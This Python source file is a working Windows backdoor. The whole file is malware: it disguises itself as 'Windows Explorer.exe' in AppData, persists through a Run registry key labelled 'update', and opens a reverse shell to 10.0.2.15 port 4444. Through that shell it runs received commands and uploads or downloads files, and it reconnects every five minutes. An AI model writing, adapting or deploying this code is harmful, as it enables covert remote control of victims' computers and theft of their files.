#!/usr/bin/env python

import socket, subprocess, json, os, base64, sys, time, shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+file_location+'"',shell=True)

    def execute_system_command(self,command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as download_file:
            return base64.b64encode(download_file.read())
    
    def write_file(self, path, content):
        with open(path, "wb") as upload_file:
            upload_file.write(base64.b64decode(content))
        return "[+] File " + path + " Uploaded."

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
    
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send("\n" + command_result + "\n")


def pop_shell():
    try: 
        my_backdoor = Backdoor("10.0.2.15", 4444)
        my_backdoor.run()
    except Exception:
        # if we couldn't connect to the shell, wait 5 minutes and try again
        time.sleep(60*5)
        pop_shell()

if __name__ == "__main__":
    pop_shell()

